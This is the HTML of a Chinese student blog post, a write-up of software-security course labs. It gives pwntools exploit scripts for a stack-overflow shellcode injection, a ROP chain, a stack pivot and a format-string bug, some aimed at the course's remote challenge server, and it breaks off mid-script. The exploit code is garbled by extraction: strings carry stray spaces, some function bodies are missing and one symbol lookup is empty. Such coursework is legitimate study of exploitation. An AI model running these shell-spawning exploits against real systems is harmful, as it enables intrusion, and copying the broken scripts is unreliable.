@@ -1,0 +1,908 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>2024软件安全原理与实践课程实验报告 | 晚栀wingee~</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="引言： 整理了一下2024年软件安全原理与实践的实验题目，丢在这里，作为一些经典题型的备忘。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024软件安全原理与实践课程实验报告">
+<meta property="og:url" content="http://47.96.29.144/2025/06/26/Ssec/index.html">
+<meta property="og:site_name" content="晚栀wingee~">
+<meta property="og:description" content="引言： 整理了一下2024年软件安全原理与实践的实验题目，丢在这里，作为一些经典题型的备忘。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps1.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps2.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps3.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps4.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps5.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps6.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps7.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps8.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps23.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/wps24.jpg">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023204138500.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023204224554.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023204214140.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023204515574.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023231852426.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023210800054.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023210847678.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023211659082.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023212316766.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023213434684.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023231358991.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241023231439927.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241106183115944.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241106183242837.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241107031013898.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241203031816184.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105145045535.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105145116923.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105150650078.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105150901889.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105151042308.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105151117672.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105155920020.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105160036751.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105162115730.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105164318679.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105164421002.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105172256101.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105173837288.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241105173915900.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241106174326517.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241106180809928.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241106180855819.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241106181833778.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241106181918762.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241106182032692.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208014422243.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241207153532637.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241207232216236.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241207232312097.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241207232423594.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241207232543311.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208002948338.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208002007334.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208002206780.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208002225306.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208002420199.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208011229992.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208012227731.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208012348147.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208115006920.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208115208931.png">
+<meta property="og:image" content="http://47.96.29.144/2025/06/26/Ssec/image-20241208114604538.png">
+<meta property="article:published_time" content="2025-06-25T17:36:59.000Z">
+<meta property="article:modified_time" content="2025-06-25T18:06:18.261Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://47.96.29.144/2025/06/26/Ssec/wps1.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="晚栀wingee~" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/avatar.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/poetry/poeting">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+							<li><a href="/tags">Tags</a></li>
+				        
+							<li><a href="/introduction">About me</a></li>
+				        
+							<li><a href="/poetry">Winegee的书房</a></li>
+				        
+							<li><a href="/log">Maintenance log</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+					        
+						</div>
+						<!-- music -->
+						
+							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
+							<div style="position: absolute; left: auto; width: 85%;">
+								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1805347343&auto=1&height=66"></iframe>
+							</div>
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/BeginCTF/" style="font-size: 10px;">BeginCTF</a> <a href="/tags/CAN-IDS/" style="font-size: 10px;">CAN-IDS</a> <a href="/tags/CTF/" style="font-size: 12px;">CTF</a> <a href="/tags/MoeCTF/" style="font-size: 10px;">MoeCTF</a> <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 12px;">Reverse</a> <a href="/tags/ZJUCTF/" style="font-size: 12px;">ZJUCTF</a> <a href="/tags/eBPF/" style="font-size: 10px;">eBPF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E7%90%86%E8%AE%BA/" style="font-size: 10px;">信息理论</a> <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" style="font-size: 12px;">堆利用</a> <a href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/" style="font-size: 10px;">安洵杯</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 10px;">密码学</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 14px;">操作系统</a> <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="font-size: 16px;">数学建模</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" style="font-size: 12px;">计算机体系结构</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FII/" style="font-size: 18px;">计算机系统II</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91/" style="font-size: 10px;">车联网</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://note.jiepeng.tech/">JPGG&#39;s NoteBook</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://47.99.33.238/">Tauhkc&#39;s Note</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://xymmsnotebook.gitbook.io/noteofxymm/">xy猫猫</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjuccnocc.github.io/Home">CCnocc</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://hzeroyuke.github.io/my_blog/">华零的Notebook</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://miraclemaster.cn/">恩浩gg</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://116.62.208.33/">SLXjj没想好标题</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjulwind.github.io/home/">ZY老师</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">aaa</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/poetry/poeting">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+					<li><a href="/tags">Tags</a></li>
+		        
+					<li><a href="/introduction">About me</a></li>
+		        
+					<li><a href="/poetry">Winegee的书房</a></li>
+		        
+					<li><a href="/log">Maintenance log</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-Ssec" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/06/26/Ssec/" class="article-date">
+  	<time datetime="2025-06-25T17:36:59.000Z" itemprop="datePublished">2025-06-26</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2024软件安全原理与实践课程实验报告
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<h3 id="引言">引言：</h3>
+<p>整理了一下2024年软件安全原理与实践的实验题目，丢在这里，作为一些经典题型的备忘。</p>
+<span id="more"></span>
+<h1 id="ssec-2024-lab01">Ssec-2024 Lab01</h1>
+<h2 id="task-1">TASK 1</h2>
+<p>观察c代码， 发现有⼀个溢出点， 并且⽤ checksec 查看⽂件， 发现什么保护都没开， 并且栈可 执⾏。</p>
+<p><img src="/2025/06/26/Ssec/wps1.jpg"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">char</span>  buffer [ LENGTH] ;</span><br><span class="line">prepare() ;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"gift address : %p\n "</span> , buffer) ;</span><br><span class="line">gets(buffer) ; # 溢出点</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span> ; </span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>所以我们只需要将shellcode布在栈上， 并且覆盖返回地址到shellcode即可。</p>
+<p>exp如下：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line">context .arch  = <span class="string">"amd64 "</span></span><br><span class="line">context .log_level =  <span class="string">"debug "</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>() :</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b <span class="string">"Please input your StudentID:\n "</span> , <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line">p  =  remote(<span class="string">"8 .154 .20 .109 "</span> , <span class="number">10100</span>)</span><br><span class="line">\<span class="comment"># p = process(" ./sbof2")</span></span><br><span class="line"></span><br><span class="line">ID_validation()</span><br><span class="line"></span><br><span class="line">p. recvuntil(b <span class="string">"gift address : "</span>)</span><br><span class="line">buffer_address = <span class="built_in">eval</span>(p. recv (<span class="number">14</span>) .decode())</span><br><span class="line">p.info(<span class="built_in">hex</span>(buffer_address))</span><br><span class="line">payload = b <span class="string">" "</span></span><br><span class="line"></span><br><span class="line">payload +=  b <span class="string">"a "</span>  * <span class="number">0x108</span></span><br><span class="line">payload  +=  p64(buffer_address  +  <span class="number">0x110</span>)</span><br><span class="line">\<span class="comment"># payload = payload .ljust(0x200 , b "\x00")</span></span><br><span class="line">payload += asm (shellcraft .sh())</span><br><span class="line">payload = payload .ljust(<span class="number">0x200</span> , b <span class="string">"\x00"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>需要注意的一点是， 远程环境可能涉及到栈对⻬的操作， 所以需要将最后传的payload对⻬为0x10 字节的整数倍（ 虽然但是， 本地不对⻬也能打通。）</p>
+<p>本地弹shell</p>
+<p><img src="/2025/06/26/Ssec/wps2.jpg"></p>
+<p>远程弹shell， 运⾏ flag .exe 如图所⽰。</p>
+<p><img src="/2025/06/26/Ssec/wps3.jpg"></p>
+<h2 id="task-2">TASK 2</h2>
+<p>IDA反汇编， 查看func函数有⼀个溢出点：</p>
+<p><img src="/2025/06/26/Ssec/wps4.jpg"></p>
+<p>由于程序是静态链接的， 所以⾥⾯的gadget⾜够我们拼出⼀个rop链, 使⽤下⾯的命令⾃动化⽣成 rop链</p>
+<p><code>ROPgadget  —binary rop2  —ropchain</code></p>
+<p><code>ROPgadget  —binary rop2  —only "pop | ret "</code></p>
+<p>在payload上⽅加上指定字节的填充， exp如下：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">context .arch  = <span class="string">"amd64 "</span></span><br><span class="line">context .log_level =  <span class="string">"debug "</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>() :</span><br><span class="line"></span><br><span class="line">io  =  remote(<span class="string">"8 .154 .20 .109 "</span> , <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(" ./ rop2")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  0x00000000004517a7  :  pop rax  ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  0x000000000040101a  :  ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  4B8FE5</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">" ./ rop2"</span>)</span><br><span class="line">pop_rax_ret  = <span class="number">0x4517a7</span></span><br><span class="line">ret =  <span class="number">0x40042e</span></span><br><span class="line">str_bin_sh  =  <span class="number">0x4ACE28</span></span><br><span class="line">pop_rdx_rbx  =  <span class="number">0x000000000049ecfb</span></span><br><span class="line">pop_rdi = <span class="number">0x400716</span></span><br><span class="line"> </span><br><span class="line">p = b <span class="string">' '</span></span><br><span class="line">p += b <span class="string">"A "</span>  * <span class="number">0x50</span></span><br><span class="line"><span class="comment">#  p += p64(0x4e92a0) # bss</span></span><br><span class="line">p += b <span class="string">"A "</span> * <span class="number">8</span></span><br><span class="line">p +=  p64(pop_rdi) <span class="comment">#  pop  rdi  ;  ret</span></span><br><span class="line">p  +=  p64(str_bin_sh)  <span class="comment">#  @  .data</span></span><br><span class="line">p  +=  p64( ret)</span><br><span class="line">p +=  p64(elf .sym [])</span><br><span class="line">ID_validation()</span><br><span class="line">io .sendlineafter(b <span class="string">"[* ] Please input the length of data:\n "</span> , <span class="built_in">str</span>(<span class="built_in">len</span>(p )))</span><br><span class="line">io .sendlineafter(b <span class="string">"[* ] Please input the data:\n "</span> , p )</span><br><span class="line">io .info(<span class="built_in">hex</span>(<span class="built_in">len</span>(p )))</span><br><span class="line"></span><br><span class="line">io .interactive()</span><br></pre></td></tr></table></figure></p>
+<p>本地弹shell</p>
+<p><img src="/2025/06/26/Ssec/wps5.jpg"></p>
+<p>远程弹shell， 运⾏ flag .exe</p>
+<p><img src="/2025/06/26/Ssec/wps6.jpg"></p>
+<h2 id="task-3">TASK 3</h2>
+<p>IDA反汇编观察有一个溢出点在 func 函数⾥：</p>
+<p><img src="/2025/06/26/Ssec/wps7.jpg"></p>
+<p>可以溢出 0x10 个字节， 查看gadget可以看到有 leave; ret</p>
+<p><img src="/2025/06/26/Ssec/wps8.jpg"></p>
+<p>那么正好把 rbp 覆盖成 gbuffer ， ret_addr 覆盖成 leave; ret , 把栈迁到 gbuffer 上。 在上⼀个函数中我们可以控制 gbuffer ， 就可以实现栈迁移+ rop 了。</p>
+<p>再从程序⾥找⼀些gadget， exp如下：</p>
+<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn <span class="keyword">import</span>  *</span><br><span class="line"> </span><br><span class="line">context .arch  = <span class="string">"amd64 "</span></span><br><span class="line">context .log_level =  <span class="string">"debug "</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>() :</span><br><span class="line">	p.sendlineafter(b <span class="string">"Please input your StudentID:\n "</span> , <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line"><span class="comment">#  p  = remote("8 .154 .20 .109 " , 10102)</span></span><br><span class="line">p = process(<span class="string">" ./ rop3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000400700  :  leave  ;  ret</span></span><br><span class="line"><span class="comment">#  0x0000000000400823  :  pop rdi  ; ret</span></span><br><span class="line"><span class="comment">#  0x0000000000400586  :  ret</span></span><br><span class="line">pop_rdi_ret  =  <span class="number">0x400823</span></span><br><span class="line">leave_ret  =  <span class="number">0x400700</span></span><br><span class="line">ret =  <span class="number">0x400586</span></span><br><span class="line">gbuffer  = <span class="number">0x6020A0</span></span><br><span class="line">\<span class="comment"># ID_validation()</span></span><br><span class="line">p. recvuntil(b <span class="string">"gift system address :  "</span>)</span><br><span class="line">system  =  <span class="built_in">eval</span>(p. recv (<span class="number">8</span> ) .decode())</span><br><span class="line">payload = b <span class="string">"A "</span>  *  <span class="number">8</span></span><br><span class="line">payload +=  p64(pop_rdi_ret)</span><br><span class="line">payload  +=  p64(gbuffer  +  <span class="number">5</span>  * <span class="number">8</span> )  <span class="comment"># bin_sh字符串的地址</span></span><br><span class="line">payload +=  p64( ret)  <span class="comment"># 16字节栈对齐</span></span><br><span class="line">payload  +=  p64(system)</span><br><span class="line">payload +=  b <span class="string">"/bin/sh\x00 "</span>  <span class="comment">#  如果放在栈的低位 ，调用system的时候可能把字符串给覆盖掉。这里 放在栈的高位比较保险</span></span><br><span class="line">p.sendlineafter(b <span class="string">"\n "</span> , payload)</span><br><span class="line"></span><br><span class="line">payload = b <span class="string">" "</span></span><br><span class="line">payload += b <span class="string">"A "</span>  * <span class="number">0x40</span></span><br><span class="line">payload  +=  p64(gbuffer)  <span class="comment"># 覆盖rbp</span></span><br><span class="line">payload +=  p64(leave_ret) <span class="comment"># 覆盖ret_addr</span></span><br><span class="line"><span class="comment">#  pause()</span></span><br><span class="line">p.sendlineafter(b <span class="string">"&gt; "</span> , payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>本地弹shell</p>
+<p><img src="/2025/06/26/Ssec/wps23.jpg"></p>
+<p>远程弹shell， 运⾏flag.exe</p>
+<p><img src="/2025/06/26/Ssec/wps24.jpg"></p>
+<h1 id="ssec-2024-lab02">Ssec-2024 Lab02</h1>
+<h2 id="task-1-1">Task 1</h2>
+<p>程序告诉了我们一个变量在栈中的栈地址，并且初始值为<code>0xBEAF</code>，并且给出了一个栈上的格式化字符串漏洞。</p>
+<p><img src="/2025/06/26/Ssec/image-20241023204138500.png"></p>
+<p>首先通过gdb动态调试出s相对于printf解析字符串时栈顶的偏移：</p>
+<p><img src="/2025/06/26/Ssec/image-20241023204224554.png"></p>
+<p><img src="/2025/06/26/Ssec/image-20241023204214140.png"></p>
+<p>偏移为7的时候是<code>0xbeaf</code> 那么偏移是8的时候就是我们输出的<code>s</code>了。</p>
+<p>我们只要把这个数值改为不是<code>0XBEAF</code>就可以，我这里把他改为1。</p>
+<p>将地址布置在栈上，算好偏移，写入1，即可拿到shell。</p>
+<p>本题exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"Please input your StudentID:\n"</span>, <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("8.154.20.109", 10100)</span></span><br><span class="line">p = process(<span class="string">"./fsb1"</span>)</span><br><span class="line"></span><br><span 